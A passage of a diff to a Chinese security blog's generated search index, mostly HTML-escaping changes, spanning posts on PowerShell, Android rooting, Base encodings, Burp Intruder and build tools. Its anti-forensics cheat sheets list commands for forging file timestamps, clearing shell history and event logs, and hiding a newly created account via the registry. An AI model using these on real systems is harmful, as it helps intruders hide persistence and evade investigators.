@@ -17,10 +17,10 @@
     <content><![CDATA[<p>PowerShell 是微软用来取代 CMD 的一个强大的 Shell。</p>
 <h2 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h2><p>在不同版本的 Windows 中已经内置了不同版本的 PowerShell，常见情况如下：</p>
 <ul>
-<li>Windows XP SP2 / Server 2003 SP1：PowerShell 1.0</li>
-<li>Windows 7 / Server 2008：PowerShell 2.0，此版本包含了 PowerShell ISE，即 Integrated Scripting Environment（集成的脚本环境），更方便的编写 PowerShell 脚本。</li>
-<li>Windows 8 / Server 2012：PowerShell 3.0，从此版本开始，PowerShell 被集成进了 WMF 中，即 Windows Management Framework（Windows 管理框架）。</li>
-<li>Windows 8.1 / Server 2012 R2：PowerShell 4.0</li>
+<li>Windows XP SP2 &#x2F; Server 2003 SP1：PowerShell 1.0</li>
+<li>Windows 7 &#x2F; Server 2008：PowerShell 2.0，此版本包含了 PowerShell ISE，即 Integrated Scripting Environment（集成的脚本环境），更方便的编写 PowerShell 脚本。</li>
+<li>Windows 8 &#x2F; Server 2012：PowerShell 3.0，从此版本开始，PowerShell 被集成进了 WMF 中，即 Windows Management Framework（Windows 管理框架）。</li>
+<li>Windows 8.1 &#x2F; Server 2012 R2：PowerShell 4.0</li>
 <li>Windows 10：PowerShell 5.0，此版本的 WMF 包含了 PowerShellGet，可用于在线下载、安装模块。</li>
 </ul>
 <span id="more"></span>
@@ -118,7 +118,7 @@
 <h2 id="Linux相关"><a href="#Linux相关" class="headerlink" title="Linux相关"></a>Linux相关</h2><p>在Linux中获得root权限有2个命令，<code>su</code>与<code>sudo</code>，<code>sudo</code>只是为了短暂的获得root权限以执行某些操作(superuser do)，而<code>su</code>其实是为了切换用户(switch user)，但当其不带参数直接执行时，默认为切换到root用户。使用<code>sudo</code>执行某些需要root权限的操作时，需要输入当前用户的密码；而直接使用<code>su</code>切换到root用户时，需要输入root用户的密码。<br>在Linux中，文件的权限有<code>rwx</code>三种，即可读(read)、可写(write)、可执行(execute)，其中<code>r</code>又等于4，<code>w</code>等于2，<code>x</code>等于1。所以，如果一个文件同时具有<code>rwx</code>权限，那么它的权限位就等于7。</p>
 <span id="more"></span>
 <h2 id="Android相关"><a href="#Android相关" class="headerlink" title="Android相关"></a>Android相关</h2><p>Android本身是不愿意让用户获得root权限的，所以Android中没有<code>su</code>或<code>sudo</code>这些命令。所以，获得root权限的第一步就是要把<code>su</code>命令拷贝到Android的<code>/system/bin</code>或<code>/system/xbin</code>目录下。但是拷贝之后并不能直接使用<code>su</code>命令，因为Android中<code>su</code>的运行机制和Linux中不同。在Android中只有root用户才能使用<code>su</code>命令，非root用户无权使用<code>su</code>命令。这其实是一个逻辑闭环：使用<code>su</code>命令可以切换到root，但只有root用户才可以使用<code>su</code>命令。好在Linux中文件的权限除了<code>rwx</code>三种之外，还有<code>s</code>权限，<code>s</code>代表当任何一个用户执行该文件时都拥有文件所有者的权限，换句话来说，如果一个文件的所有者是root，且它的执行权限标志位是<code>s</code>，那么不管谁执行这个文件，他执行的时候都是以root身份执行的。<br>基于以上，Android获取root权限大致可以分为如下3步：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 拷贝su到指定目录下</span></span><br><span class="line">cp /data/tmp/su /system/bin/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将su所有者设为root</span></span><br><span class="line">chown root:root su</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将su标志位设为-rwsr-xr-x</span></span><br><span class="line">chmod 4775 /system/bin/su</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 拷贝su到指定目录下</span></span><br><span class="line"><span class="built_in">cp</span> /data/tmp/su /system/bin/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将su所有者设为root</span></span><br><span class="line"><span class="built_in">chown</span> root:root su</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将su标志位设为-rwsr-xr-x</span></span><br><span class="line"><span class="built_in">chmod</span> 4775 /system/bin/su</span><br></pre></td></tr></table></figure>
 
 <p>但是，除了上面第一步以外，剩下两步都需要root权限才能成功执行，这就又造成了一个逻辑闭环：即通过上面的代码可以获得root权限，但必须有root权限才能执行上面的代码。这时的解决办法就是寻找Android系统的漏洞，系统中有些进程是以root权限运行的，只有找出那些有漏洞的进程，然后利用缓冲区溢出让其执行我们上面的命令，即可完成root。<br>所以，总的来说，Android获取root权限最重要的一步，就是寻找系统的漏洞，然后利用之。</p>
 <h2 id="术语"><a href="#术语" class="headerlink" title="术语"></a>术语</h2><p>了解了Android root的基本原理后，需要理清一些常用术语：</p>
@@ -136,7 +136,7 @@
     <url>/2019/03/23/android-shuaji-guide/</url>
     <content><![CDATA[<h2 id="名词解释"><a href="#名词解释" class="headerlink" title="名词解释"></a>名词解释</h2><h3 id="软重启与硬重启"><a href="#软重启与硬重启" class="headerlink" title="软重启与硬重启"></a>软重启与硬重启</h3><p><strong>软重启</strong>（又称<strong>热重启</strong>）是指从操作系统层面上关机再开机，而<strong>硬重启</strong>（又称<strong>冷重启</strong>）是指直接关掉电源再开机。类似的，也有<strong>软（热）关机</strong>和<strong>硬（冷）关机</strong>，其区别类似于在 Windows “开始”菜单中点击关机和直接关掉主机电源的区别。一般而言，软（热）关机对设备更好。</p>
 <span id="more"></span>
-<h3 id="Bootloader-fastboot-Recovery"><a href="#Bootloader-fastboot-Recovery" class="headerlink" title="Bootloader/fastboot/Recovery"></a>Bootloader/fastboot/Recovery</h3><h3 id="Full-OTA-Image-与-Factory-Image"><a href="#Full-OTA-Image-与-Factory-Image" class="headerlink" title="Full OTA Image 与 Factory Image"></a>Full OTA Image 与 Factory Image</h3><h2 id="刷机流程"><a href="#刷机流程" class="headerlink" title="刷机流程"></a>刷机流程</h2><ol>
+<h3 id="Bootloader-x2F-fastboot-x2F-Recovery"><a href="#Bootloader-x2F-fastboot-x2F-Recovery" class="headerlink" title="Bootloader&#x2F;fastboot&#x2F;Recovery"></a>Bootloader&#x2F;fastboot&#x2F;Recovery</h3><h3 id="Full-OTA-Image-与-Factory-Image"><a href="#Full-OTA-Image-与-Factory-Image" class="headerlink" title="Full OTA Image 与 Factory Image"></a>Full OTA Image 与 Factory Image</h3><h2 id="刷机流程"><a href="#刷机流程" class="headerlink" title="刷机流程"></a>刷机流程</h2><ol>
 <li>提前备份必要的数据（下载的音乐、视频，QQ、微信的聊天记录，通话记录、短信、通讯录，相册等），尽量保持电量满。</li>
 <li>恢复出厂设置（亦或，取消所有安全机制，如屏幕锁定等，并退出 Google 账号。）。</li>
 <li>在开发者选项中开启 USB 调试。</li>
@@ -157,7 +157,7 @@
     <title>反取证之 Linux</title>
     <url>/2018/05/02/anti-forensics-linux/</url>
     <content><![CDATA[<p>后渗透测试阶段的重要工作便是擦除痕迹，也即<strong>反取证</strong>，文件系统访问都会留下痕迹，最好的避免计算机取证的方法就是不要碰文件系统，这也是 meterpreter 的先天优势，它完全基于内存，Linux 中的反取证主要涉及 MAC 时间、日志文件、history：</p>
-<h2 id="MAC-时间"><a href="#MAC-时间" class="headerlink" title="MAC 时间"></a>MAC 时间</h2><p>MAC 即 Modified/Accessed/Changed，也就是修改/访问/更改时间，修改时间指对文件内容修改时的时间，访问时间指对文件内容访问时的时间（例如通过 <code>cat</code> 查看时），更改时间指对文件属性、权限更改时的时间。</p>
+<h2 id="MAC-时间"><a href="#MAC-时间" class="headerlink" title="MAC 时间"></a>MAC 时间</h2><p>MAC 即 Modified&#x2F;Accessed&#x2F;Changed，也就是修改&#x2F;访问&#x2F;更改时间，修改时间指对文件内容修改时的时间，访问时间指对文件内容访问时的时间（例如通过 <code>cat</code> 查看时），更改时间指对文件属性、权限更改时的时间。</p>
 <p>使用 <code>ls -l</code> 默认查看的是修改时间，要查看其余 2 个时间，可以加参数 <code>ls -l --time=atime/ctime</code>，另一个查看 MAC 时间的命令是 <code>stat</code>。</p>
 <p>使用 <code>touch -d &quot;5 days ago&quot;</code> 或 <code>touch -t 1805021030</code> 可以修改 MAC 中的 MA 时间。meterpreter 中的 <code>timestomp</code> 命令可以方便的修改 MAC 时间。</p>
 <span id="more"></span>
@@ -166,7 +166,7 @@
 <p>Debian 系的 <code>auth.log</code> 文件与 RedHat 系的 <code>secure</code> 文件都记录了系统的登录日志，<code>last</code> 命令用于查看登录日志以及重启日志，文件位于 <code>/var/log/wtmp</code>；<code>lastb</code> 命令用于查看登录失败日志，文件位于 <code>/var/log/btmp</code>；<code>lastlog</code> 命令用于查看所有用户最近一次登录日志，文件位于 <code>/var/log/lastlog</code>；<code>faillog</code> 命令与 <code>lastlog</code> 命令一样，用于查看用户登录失败日志，文件位于 <code>/var/log/faillog</code>，此命令仅限于 Debian 系。</p>
 <h3 id="Web-日志"><a href="#Web-日志" class="headerlink" title="Web 日志"></a>Web 日志</h3><p>Apache 的日志文件位于 <code>/var/log/apache2</code>；Nginx 的日志文件位于 <code>/var/log/nginx</code>。</p>
 <h2 id="history"><a href="#history" class="headerlink" title="history"></a>history</h2><p>Linux 中，每次输入的命令都会记录在用户文件夹中的 <code>.bash_history</code> 文件中，默认记录 1000 条命令，使用 <code>history</code> 命令即可查看，清除记录的方法是使用 <code>history -c</code> 命令。另一种清除记录的方法是更改 <code>.bash_history</code> 文件的属性，使用命令：<code>chattr +i .bash_history</code> 使其不可被更改，从而无法向其写入任何数据。</p>
-<p><strong>最后，请不要忘记 HIDS/IPS/WAF/集中的日志服务器的痕迹擦除。</strong></p>
+<p><strong>最后，请不要忘记 HIDS&#x2F;IPS&#x2F;WAF&#x2F;集中的日志服务器的痕迹擦除。</strong></p>
 ]]></content>
       <categories>
         <category>CheatSheet</category>
@@ -182,7 +182,7 @@
     <url>/2018/05/02/anti-forensics-windows/</url>
     <content><![CDATA[<h2 id="MACE-时间"><a href="#MACE-时间" class="headerlink" title="MACE 时间"></a>MACE 时间</h2><p>和 <a href="/2018/05/02/anti-forensics-linux/" title="反取证之 Linux">反取证之 Linux</a> 中的一样，Windows 也有 MAC 时间，不过在 Windows 中，C 指的是 Created，即创建时间，Windows 中默认显示的是修改时间，另外，在 Windows 的 NTFS 文件系统中还有 E 时间，即 MFT entry，其中包含了文件的大量信息，包括大小、名称、目录位置、磁盘位置、创建日期等，在擦除痕迹时也要擦除 E 时间，同样，meterpreter 中的 <code>timestomp</code> 命令可以方便的修改 MACE 时间。</p>
 <h2 id="隐藏新建账号"><a href="#隐藏新建账号" class="headerlink" title="隐藏新建账号"></a>隐藏新建账号</h2><p>当在目标系统上新建了用户账号后，通常会在登录界面上显示出来，要实现隐藏，可以修改注册表项，采用如下命令：</p>
-<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">REG ADD HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList /v uname /t REG_DWORD /d 0</span><br></pre></td></tr></table></figure>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">REG ADD HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList /v <span class="built_in">uname</span> /t REG_DWORD /d 0</span><br></pre></td></tr></table></figure>
 
 <p>注意：这种隐藏只是在登录界面的隐藏，用户使用 <code>net user</code> 或“本地用户和组”仍然可以查到新建的账户。</p>
 <h2 id="日志文件"><a href="#日志文件" class="headerlink" title="日志文件"></a>日志文件</h2><p>清除相关日志文件</p>
@@ -191,7 +191,7 @@
 
 <p>另外，meterpreter 中的 <code>clearev</code> 命令可以删除事件查看器中的日志信息。</p>
 <h3 id="Web-日志"><a href="#Web-日志" class="headerlink" title="Web 日志"></a>Web 日志</h3><p>IIS 的日志文件位于 <code>%windir%\System32\LogFiles</code> 目录下。</p>
-<p><strong>最后，请不要忘记 HIDS/IPS/WAF/集中的日志服务器的痕迹擦除。</strong></p>
+<p><strong>最后，请不要忘记 HIDS&#x2F;IPS&#x2F;WAF&#x2F;集中的日志服务器的痕迹擦除。</strong></p>
 ]]></content>
       <categories>
         <category>CheatSheet</category>
@@ -320,8 +320,8 @@
 <li><code>jmp</code>：跳转指令，属于转移指令，如 <code>jmp 2AE3:3</code>，表示将 CS 设为 <code>2AE3H</code>，将 IP 设为 <code>0003H</code>，CPU 将从 CS:IP（即 <code>2AE33H</code>）处读取指令；<code>jmp eax</code> 表示将 EAX 的值赋给 IP，CS 保持不变。</li>
 <li><code>jnz</code>：条件跳转指令，检查 EFLAGS 标志寄存器中的 ZF 位（零标志位）是否为 0，若不为 0，则跳转。</li>
 <li><code>jz</code>：条件跳转指令，检查 EFLAGS 标志寄存器中的 ZF 位（零标志位）是否为 0，若为 0，则跳转。</li>
-<li><code>in</code>：从 I/O 端口读取内容，如 <code>in al,21H</code>，表示从 21H 端口读取内容到 AL 中。</li>
-<li><code>out</code>：向 I/O 端口写入内容，如 <code>out 21H,al</code>，表示将 AL 的值写入到 21H 端口中。</li>
+<li><code>in</code>：从 I&#x2F;O 端口读取内容，如 <code>in al,21H</code>，表示从 21H 端口读取内容到 AL 中。</li>
+<li><code>out</code>：向 I&#x2F;O 端口写入内容，如 <code>out 21H,al</code>，表示将 AL 的值写入到 21H 端口中。</li>
 <li><code>xor</code>：按位异或运算，即相同为 0，不同为 1，如 <code>xor eax,ebx</code>，表示将 EAX 和 EBX 按位异或，其值赋给 EAX。对同一个值进行异或，会使其得 0，汇编中常用这种方法得到 0，如 <code>xor eax,eax</code>。</li>
 <li><code>or</code>：按位或运算，如 <code>or eax,ebx</code>，表示将 EAX 和 EBX 按位或，其值赋给 EAX。</li>
 </ul>
@@ -452,7 +452,7 @@
   <entry>
     <title>Base 编码家族</title>
     <url>/2018/08/10/base/</url>
-    <content><![CDATA[<h2 id="Base64"><a href="#Base64" class="headerlink" title="Base64"></a>Base64</h2><p>Base64，顾名思义是一种基于 <strong>64</strong> 个可打印字符来表示二进制数据的表示方法，这 64 个字符分别为 <code>A-Z</code>、<code>a-z</code>、<code>0-9</code> 以及 <code>+</code> 与 <code>/</code>。64 个字符可用 6 个比特位表示，3 个字节有 24 个比特位，对应于 4 个 Base64 单元，所以编码后的数据要比原始数据略长，为原来的 4/3。Base64 索引表如下所示：</p>
+    <content><![CDATA[<h2 id="Base64"><a href="#Base64" class="headerlink" title="Base64"></a>Base64</h2><p>Base64，顾名思义是一种基于 <strong>64</strong> 个可打印字符来表示二进制数据的表示方法，这 64 个字符分别为 <code>A-Z</code>、<code>a-z</code>、<code>0-9</code> 以及 <code>+</code> 与 <code>/</code>。64 个字符可用 6 个比特位表示，3 个字节有 24 个比特位，对应于 4 个 Base64 单元，所以编码后的数据要比原始数据略长，为原来的 4&#x2F;3。Base64 索引表如下所示：</p>
 <table>
 <thead>
 <tr>
@@ -624,7 +624,7 @@
 <td>47</td>
 <td>v</td>
 <td>63</td>
-<td>/</td>
+<td>&#x2F;</td>
 </tr>
 </tbody></table>
 <span id="more"></span>
@@ -695,11 +695,11 @@
 <td>b</td>
 <td>G</td>
 <td>8</td>
-<td>=</td>
+<td>&#x3D;</td>
 </tr>
 </tbody></table>
 <p>若原数据不是 3 的倍数，且多出 1 个字节，则在编码末尾加 2 个 <code>=</code>，多出 2 个字节，则在编码末尾加 1 个 <code>=</code>。换言之，若多出 1 个字节，则最后一个 6 位的 Base64 字节块有 4 位是 0 值，若多出 2 个字节，则最后一个 6 位的 Base64 字节块有 2 位是 0 值。</p>
-<h2 id="Base32"><a href="#Base32" class="headerlink" title="Base32"></a>Base32</h2><p>与上类似，Base32 基于 32 个可打印字符，分别为 <code>A-Z</code> 以及 <code>2-7</code>。32 个字符可用 5 个比特位表示，5 个字节有 40 个比特位，对应于 8 个 Base32 单元，编码后的数据比原始数据略长 8/5。若原数据不是 5 的倍数，且多出 1 个字节，则在编码末尾加 4 个 <code>=</code>，多出 2 个字节，则在编码末尾加 3 个 <code>=</code>，多出 3 个字节，则在编码末尾加 2 个 <code>=</code>，多出 4 个字节，则在编码末尾加 1 个 <code>=</code>。Base32 索引表如下所示：</p>
+<h2 id="Base32"><a href="#Base32" class="headerlink" title="Base32"></a>Base32</h2><p>与上类似，Base32 基于 32 个可打印字符，分别为 <code>A-Z</code> 以及 <code>2-7</code>。32 个字符可用 5 个比特位表示，5 个字节有 40 个比特位，对应于 8 个 Base32 单元，编码后的数据比原始数据略长 8&#x2F;5。若原数据不是 5 的倍数，且多出 1 个字节，则在编码末尾加 4 个 <code>=</code>，多出 2 个字节，则在编码末尾加 3 个 <code>=</code>，多出 3 个字节，则在编码末尾加 2 个 <code>=</code>，多出 4 个字节，则在编码末尾加 1 个 <code>=</code>。Base32 索引表如下所示：</p>
 <table>
 <thead>
 <tr>
@@ -862,7 +862,7 @@
 <li>计算 <code>Base64URL 编码长度 % 4</code> 的值：<br>a. 结果为 0，不做处理<br>b. 结果为 2，字符串添加 <code>==</code><br>c. 结果为 3，字符串添加 <code>=</code></li>
 </ol>
 <h2 id="XXencode"><a href="#XXencode" class="headerlink" title="XXencode"></a>XXencode</h2><p>XXencode 不属于 Base 编码家族，但与 Base64 编码极为类似，区别仅在于 64 个可打印字符及其顺序，XXencode 使用的为 <code>+</code>、<code>-</code>、<code>0-9</code>、<code>A-Z</code>、<code>a-z</code>。</p>
-<h2 id="UUencode"><a href="#UUencode" class="headerlink" title="UUencode"></a>UUencode</h2><p>UUencode 也与 Base64 极为类似，它使用的字符及其顺序为 <code>(space)</code>、<code>!</code>、<code>&quot;</code>、<code>#</code>、<code>$</code>、<code>%</code>、<code>&amp;</code>、<code>&#39;</code>、<code>(</code>、<code>)</code>、<code>*</code>、<code>+</code>、<code>,</code>、<code>-</code>、<code>.</code>、<code>/</code>、<code>0-9</code>、<code>:</code>、<code>;</code>、<code>&lt;</code>、<code>=</code>、<code>&gt;</code>、<code>?</code>、<code>@</code>、<code>A-Z</code>、<code>[</code>、<code>\</code>、<code>]</code>、<code>^</code>、<code>_</code>、`。</p>
+<h2 id="UUencode"><a href="#UUencode" class="headerlink" title="UUencode"></a>UUencode</h2><p>UUencode 也与 Base64 极为类似，它使用的字符及其顺序为 <code>(space)</code>、<code>!</code>、<code>&quot;</code>、<code>#</code>、<code>$</code>、<code>%</code>、<code>&amp;</code>、<code>&#39;</code>、<code>(</code>、<code>)</code>、<code>*</code>、<code>+</code>、<code>,</code>、<code>-</code>、<code>.</code>、<code>/</code>、<code>0-9</code>、<code>:</code>、<code>;</code>、<code>&lt;</code>、<code>=</code>、<code>&gt;</code>、<code>?</code>、<code>@</code>、<code>A-Z</code>、<code>[</code>、<code>\</code>、<code>]</code>、<code>^</code>、<code>_</code>、&#96;。</p>
 ]]></content>
       <categories>
         <category>CheatSheet</category>
@@ -929,7 +929,7 @@
 <li><code>]</code>：如果指针指向的单元值不为零，向前跳转到对应的 <code>[</code> 指令的次一指令处</li>
 </ul>
 <p>下面是一个用 Brainfuck 在屏幕上打印 <code>Hello World</code> 的程序例子：</p>
-<figure class="highlight brainfuck"><table><tr><td class="code"><pre><span class="line">++<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="title">[</span>&gt;++<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>&gt;++<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>&gt;++<span class="literal">+</span>&gt;<span class="literal">+</span>&lt;&lt;&lt;&lt;<span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;++<span class="string">.</span>&gt;<span class="literal">+</span><span class="string">.</span>++<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="string">.</span><span class="string">.</span>++<span class="literal">+</span><span class="string">.</span>&gt;++<span class="string">.</span>&lt;&lt;++<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="string">.</span></span><br><span class="line">&gt;<span class="string">.</span>++<span class="literal">+</span><span class="string">.</span>--<span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="string">.</span>--<span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="string">.</span>&gt;<span class="literal">+</span><span class="string">.</span>&gt;<span class="string">.</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight brainfuck"><table><tr><td class="code"><pre><span class="line"><span class="literal">++++++++++</span><span class="title">[</span>&gt;<span class="literal">+++++++</span>&gt;<span class="literal">++++++++++</span>&gt;<span class="literal">+++</span>&gt;<span class="literal">+</span>&lt;&lt;&lt;&lt;<span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">++</span><span class="string">.</span>&gt;<span class="literal">+</span><span class="string">.</span><span class="literal">+++++++</span><span class="string">.</span><span class="string">.</span><span class="literal">+++</span><span class="string">.</span>&gt;<span class="literal">++</span><span class="string">.</span>&lt;&lt;<span class="literal">+++++++++++++++</span><span class="string">.</span></span><br><span class="line">&gt;<span class="string">.</span><span class="literal">+++</span><span class="string">.</span><span class="literal">------</span><span class="string">.</span><span class="literal">--------</span><span class="string">.</span>&gt;<span class="literal">+</span><span class="string">.</span>&gt;<span class="string">.</span></span><br></pre></td></tr></table></figure>
 
 <p>程序的运行结果如 <a href="https://fatiherikli.github.io/brainfuck-visualizer/">Brainfuck Visualizer</a> 所示。</p>
 ]]></content>
@@ -940,7 +940,7 @@
   <entry>
     <title>Sniper、Battering ram、Pitchfork、Cluster bomb 的区别</title>
     <url>/2018/05/01/burpsuite-intruder-attack-type/</url>
-    <content><![CDATA[<p>Burp Suite 中的 Intruder 模块里有 4 种攻击模式，分别为 Sniper、Battering ram、Pitchfork、Cluster bomb，在这里假设 Payload set1=[1, 2]，Payload set2=[a, b, c, d]：</p>
+    <content><![CDATA[<p>Burp Suite 中的 Intruder 模块里有 4 种攻击模式，分别为 Sniper、Battering ram、Pitchfork、Cluster bomb，在这里假设 Payload set1&#x3D;[1, 2]，Payload set2&#x3D;[a, b, c, d]：</p>
 <h2 id="Sniper"><a href="#Sniper" class="headerlink" title="Sniper"></a>Sniper</h2><p>Sniper，中文“狙击手”，每次只针对 1 个 Payload Position，使用 1 个 Payload set，示例如下：</p>
 <table>
 <thead>
@@ -1406,8 +1406,8 @@
 <p>现在的很多构建系统也包含了<strong>包管理器（package manager）</strong>的功能，用以解决项目依赖的问题。</p>
 <span id="more"></span>
 
-<h2 id="另外的"><a href="#另外的" class="headerlink" title="另外的"></a>另外的</h2><p>在 Linux 中 编译 C/C++，使用最广的编译器是 <strong><a href="https://gcc.gnu.org/">GCC</a></strong> ，即 GNU Compiler Collection（GNU 编译器套件），GCC 的原名为 GNU C Compiler（GNU C 语言编译器），因为在后续逐渐支持了 C++、Java 等更多的语言，所以更改了其缩写的含义。有关 GCC 更详细的信息可参考 <a href="/2019/04/18/gcc/" title="GCC 小记">GCC 小记</a>。</p>
-<p>除此之外，另一个 C/C++ 编译器 <strong><a href="http://clang.llvm.org/">Clang</a></strong> 旨在替代 GCC。</p>
+<h2 id="另外的"><a href="#另外的" class="headerlink" title="另外的"></a>另外的</h2><p>在 Linux 中 编译 C&#x2F;C++，使用最广的编译器是 <strong><a href="https://gcc.gnu.org/">GCC</a></strong> ，即 GNU Compiler Collection（GNU 编译器套件），GCC 的原名为 GNU C Compiler（GNU C 语言编译器），因为在后续逐渐支持了 C++、Java 等更多的语言，所以更改了其缩写的含义。有关 GCC 更详细的信息可参考 <a href="/2019/04/18/gcc/" title="GCC 小记">GCC 小记</a>。</p>
+<p>除此之外，另一个 C&#x2F;C++ 编译器 <strong><a href="http://clang.llvm.org/">Clang</a></strong> 旨在替代 GCC。</p>
 <p>在 Linux 中使用最广的构建系统是 <strong><a href="https://www.gnu.org/software/make/">GNU make</a></strong> ，它会读取 <strong>Makefile</strong> 文件中的配置信息来完成构建，有关 Makefile 文件更详细的信息可参考 <a href="/2019/04/18/makefile/" title="Makefile 小记">Makefile 小记</a>。</p>
 <p>Java 世界中使用最广的构建系统是 <strong><a href="https://maven.apache.org/">Maven</a></strong> ，而在 Android Studio 中则使用到了后起之秀 <strong><a href="https://gradle.org/">Gradle</a></strong> 。</p>
 <p>C 语言从源代码到可执行文件的过程依次经过了<strong>预处理</strong>、<strong>编译</strong>、<strong>链接</strong>这几个步骤，即我们常说的 GCC 是编译器，但它实际可以完成的工作不止是编译，具体生成结果取决于我们的参数。</p>
@@ -1422,7 +1422,7 @@
     <url>/2017/12/14/cs373-1/</url>
     <content><![CDATA[<h2 id="一：定位"><a href="#一：定位" class="headerlink" title="一：定位"></a>一：定位</h2><p>蒙特卡罗定位是感知和运动的循环，每次感知都会获得信息，每次运动都会丢失信息，感知函数利用了贝叶斯规则，运动函数利用了全概率定理。</p>
 <p>基于一维的蒙特卡罗定位程序如下：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">world = [<span class="string">&#x27;green&#x27;</span>, <span class="string">&#x27;red&#x27;</span>, <span class="string">&#x27;red&#x27;</span>, <span class="string">&#x27;green&#x27;</span>, <span class="string">&#x27;green&#x27;</span>]</span><br><span class="line">measurements = [<span class="string">&#x27;red&#x27;</span>, <span class="string">&#x27;green&#x27;</span>]</span><br><span class="line">motions = [<span class="number">1</span>, <span class="number">1</span>]</span><br><span class="line">pHit = <span class="number">0.6</span></span><br><span class="line">pMiss = <span class="number">0.2</span></span><br><span class="line">pExact = <span class="number">0.8</span></span><br><span class="line">pOvershoot = <span class="number">0.1</span></span><br><span class="line">pUndershoot = <span class="number">0.1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sense</span>(<span class="params">p, Z</span>):</span></span><br><span class="line">    q = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(p)):</span><br><span class="line">        hit = (Z == world[i])</span><br><span class="line">        q.append(p[i] * (hit * pHit + (<span class="number">1</span>-hit) * pMiss))</span><br><span class="line">    s = <span class="built_in">sum</span>(q)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(p)):</span><br><span class="line">        q[i] = q[i]/s</span><br><span class="line">    <span class="keyword">return</span> q</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">move</span>(<span class="params">p, U</span>):</span></span><br><span class="line">    q = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(p)):</span><br><span class="line">        s = pExact * p[(i-U) % <span class="built_in">len</span>(p)]</span><br><span class="line">        s = s + pOvershoot * p[(i-U-<span class="number">1</span>) % <span class="built_in">len</span>(p)]</span><br><span class="line">        s = s + pUndershoot * p[(i-U+<span class="number">1</span>) % <span class="built_in">len</span>(p)]</span><br><span class="line">        q.append(s)</span><br><span class="line">    <span class="keyword">return</span> q</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(measurements)):</span><br><span class="line">    p = sense(p, measurements[k])</span><br><span class="line">    p = move(p, motions[k])</span><br><span class="line">    <span class="built_in">print</span> p</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">world = [<span class="string">&#x27;green&#x27;</span>, <span class="string">&#x27;red&#x27;</span>, <span class="string">&#x27;red&#x27;</span>, <span class="string">&#x27;green&#x27;</span>, <span class="string">&#x27;green&#x27;</span>]</span><br><span class="line">measurements = [<span class="string">&#x27;red&#x27;</span>, <span class="string">&#x27;green&#x27;</span>]</span><br><span class="line">motions = [<span class="number">1</span>, <span class="number">1</span>]</span><br><span class="line">pHit = <span class="number">0.6</span></span><br><span class="line">pMiss = <span class="number">0.2</span></span><br><span class="line">pExact = <span class="number">0.8</span></span><br><span class="line">pOvershoot = <span class="number">0.1</span></span><br><span class="line">pUndershoot = <span class="number">0.1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sense</span>(<span class="params">p, Z</span>):</span><br><span class="line">    q = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(p)):</span><br><span class="line">        hit = (Z == world[i])</span><br><span class="line">        q.append(p[i] * (hit * pHit + (<span class="number">1</span>-hit) * pMiss))</span><br><span class="line">    s = <span class="built_in">sum</span>(q)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(p)):</span><br><span class="line">        q[i] = q[i]/s</span><br><span class="line">    <span class="keyword">return</span> q</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">move</span>(<span class="params">p, U</span>):</span><br><span class="line">    q = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(p)):</span><br><span class="line">        s = pExact * p[(i-U) % <span 